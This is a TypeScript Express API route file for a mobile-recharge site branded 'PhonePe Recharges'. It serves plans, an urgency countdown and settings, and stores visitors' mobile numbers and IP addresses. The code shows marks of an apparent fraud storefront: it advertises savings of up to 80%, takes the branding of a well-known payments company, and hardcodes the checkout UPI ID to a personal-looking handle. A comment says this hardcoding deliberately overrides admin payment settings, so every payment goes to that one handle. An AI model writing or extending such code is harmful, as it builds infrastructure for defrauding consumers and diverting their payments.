import { Router } from 'express';
import { db } from '../db.js';
import crypto from 'crypto';
import { getPersistentPaymentSettings, isSupabasePaymentSettingsConfigured } from '../supabasePaymentSettings.js';

export const publicRouter = Router();

// GET /api/providers - active providers for customer operator selector
publicRouter.get('/providers', async (_req, res) => {
  try {
    const providers = await db.all(`
      SELECT id, slug, name, brand_color as "brandColor", badge_bg as "badgeBg", text_color as "textColor", tagline, logo_url as "logoUrl", description
      FROM network_providers
      WHERE is_active = 1
      ORDER BY display_order ASC, name ASC
    `);

    res.json({ success: true, providers });
  } catch (err) {
    console.error('[API_ERROR] GET /api/providers:', err);
    res.status(500).json({ error: 'Failed to retrieve providers' });
  }
});

// GET /api/plans - published plans for customer website
publicRouter.get('/plans', async (req, res) => {
  try {
    const { providerId, operatorId } = req.query;
    const targetProvider = (providerId || operatorId) as string | undefined;

    let query = `
      SELECT id, provider_id as "operatorId", price, original_price as "originalPrice", validity, data_allowance as data, voice, sms, tag, category, status, display_order
      FROM recharge_plans
      WHERE status = 'published'
    `;
    const params: string[] = [];

    if (targetProvider) {
      query += ` AND provider_id = ?`;
      params.push(targetProvider);
    }

    query += ` ORDER BY price DESC`;

    const plans = await db.all(query, [...params]);
    res.json({ success: true, plans });
  } catch (err) {
    console.error('[API_ERROR] GET /api/plans:', err);
    res.status(500).json({ error: 'Failed to retrieve plans' });
  }
});

// GET /api/offers/active - active promotional campaign & server-synchronized countdown timer
publicRouter.get('/offers/active', async (_req, res) => {
  try {
    const now = new Date();
    const offer = await db.get(`
      SELECT id, title, message, subtitle, banner_url as "bannerUrl", timer_mode as "timerMode", start_time as "startTime", end_time as "endTime", duration_minutes as "durationMinutes", status
      FROM special_offers
      WHERE status = 'active'
      ORDER BY display_order ASC
      LIMIT 1
    `) as {
      id: string;
      title: string;
      message: string;
      subtitle: string;
      bannerUrl: string;
      timerMode: string;
      startTime: string;
      endTime: string;
      durationMinutes: number;
      status: string;
    } | undefined;

    if (!offer) {
      return res.json({ success: true, offer: null });
    }

    // Check if offer has expired based on server time
    const endTimestamp = new Date(offer.endTime).getTime();
    const currentTimestamp = now.getTime();
    const isExpired = endTimestamp <= currentTimestamp;

    if (isExpired) {
      // Auto-update status to expired if duration/deadline passed
      await db.run(`UPDATE special_offers SET status = 'expired', updated_at = ? WHERE id = ?`, [now.toISOString(), offer.id]);
      return res.json({
        success: true,
        offer: {
          ...offer,
          status: 'expired',
          remainingSeconds: 0,
          serverNow: now.toISOString(),
        },
      });
    }

    const remainingSeconds = Math.max(0, Math.floor((endTimestamp - currentTimestamp) / 1000));

    res.json({
      success: true,
      offer: {
        ...offer,
        remainingSeconds,
        serverNow: now.toISOString(),
      },
    });
  } catch (err) {
    console.error('[API_ERROR] GET /api/offers/active:', err);
    res.status(500).json({ error: 'Failed to retrieve active offer' });
  }
});

// GET /api/settings - public settings for headline, banner, and notice
publicRouter.get('/settings', async (_req, res) => {
  try {
    const rows = await db.all(`SELECT setting_key, setting_value FROM website_settings`) as { setting_key: string; setting_value: string }[];
    const settings: Record<string, string> = {};
    for (const row of rows) {
      settings[row.setting_key] = row.setting_value;
    }

    if (isSupabasePaymentSettingsConfigured()) Object.assign(settings, await getPersistentPaymentSettings());

    res.json({
      success: true,
      settings: {
        siteTitle: settings.site_title || 'PhonePe Recharges',
        bannerHeadline: settings.banner_headline || 'BEST SAVINGS OFFERS!',
        bannerSubtitle: settings.banner_subtitle || 'Save up to 80% on annual & 5G recharge packs',
        countdownLabel: settings.countdown_label || 'Special Offer Ends In',
        countdownVisible: settings.countdown_visible !== 'false',
        bannerVisible: settings.banner_visible !== 'false',
        announcementBar: settings.announcement_bar || '',
        privacyNoticeText: settings.privacy_notice_text || 'By entering your number, you consent to processing your mobile number and operator for recharge estimation.',
        privacyNoticeVersion: settings.privacy_notice_version || 'v1.0',
        customerSupportContact: settings.customer_support_contact || settings.support_contact || '',
        // Checkout payment details are intentionally hardcoded to the verified production destination.
        // Do not let stale persisted/admin settings silently redirect customer payments.
        upiId: 'qwerty779@ibl',
        qrCodeUrl: '/assets/upi-qr.svg',
      },
    });
  } catch (err) {
    console.error('[API_ERROR] GET /api/settings:', err);
    res.status(500).json({ error: 'Failed to retrieve website settings' });
  }
});

// POST /api/submissions - Customer Mobile-Number Submission
// Deliberate form submission with explicit consent
publicRouter.post('/submissions', async (req, res) => {
  try {
    const { mobileNumber, providerId, planId, consentVersion } = req.body;

    if (!providerId) {
      return res.status(400).json({ error: 'Network provider selection is required.' });
    }

    if (!mobileNumber) {
      return res.status(400).json({ error: 'Mobile number is required.' });
    }

    // Server-side mobile number validation
    const cleanedNumber = String(mobileNumber).replace(/\D/g, '');
    const tenDigit = cleanedNumber.length === 12 && cleanedNumber.startsWith('91') ? cleanedNumber.slice(2) : cleanedNumber;

    if (tenDigit.length !== 10 || !/^[6-9]\d{9}$/.test(tenDigit)) {
      return res.status(400).json({ error: 'Please enter a valid 10-digit Indian mobile number starting with 6, 7, 8, or 9.' });
    }

    // Verify provider exists and is active
    const provider = await db.get('SELECT id, name, is_active FROM network_providers WHERE id = ?', [providerId]) as {
      id: string;
      name: string;
      is_active: number;
    } | undefined;

    if (!provider || provider.is_active !== 1) {
      return res.status(400).json({ error: 'The selected network provider is currently unavailable.' });
    }

    // Optional plan snapshot
    let planSnapshot: string | null = null;
    if (planId) {
      const plan = await db.get('SELECT * FROM recharge_plans WHERE id = ?', [planId]);
      if (plan) {
        planSnapshot = JSON.stringify(plan);
      }
    }

    const ip = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1';
    const now = new Date().toISOString();
    const submissionId = 'sub-' + crypto.randomUUID();

    // Idempotency check: prevent duplicate rapid retries (within 10 seconds for same number and provider)
    const tenSecondsAgo = new Date(Date.now() - 10 * 1000).toISOString();
    const recentDuplicate = await db.get(`
      SELECT id FROM customer_submissions
      WHERE mobile_number = ? AND provider_id = ? AND created_at >= ?
      LIMIT 1
    `, [tenDigit, provider.id, tenSecondsAgo]) as { id: string } | undefined;

    if (recentDuplicate) {
      return res.json({
        success: true,
        submissionId: recentDuplicate.id,
        message: 'Submission already recorded',
      });
    }

    await db.run(`
      INSERT INTO customer_submissions (id, mobile_number, provider_id, provider_name, plan_id, plan_snapshot, status, consent_version, client_ip, created_at)
      VALUES (?, ?, ?, ?, ?, ?, 'submitted', ?, ?, ?)
    `, [
      submissionId,
      tenDigit,
      provider.id,
      provider.name,
      planId || null,
      planSnapshot,
      consentVersion || 'v1.0',
      ip,
      now
    ]);

    res.json({
      success: true,
      submissionId,
      message: 'Mobile number and operator selection recorded securely.',
    });
  } catch (err) {
    console.error('[API_ERROR] POST /api/submissions:', err);
    res.status(500).json({ error: 'Failed to record submission' });
  }
});
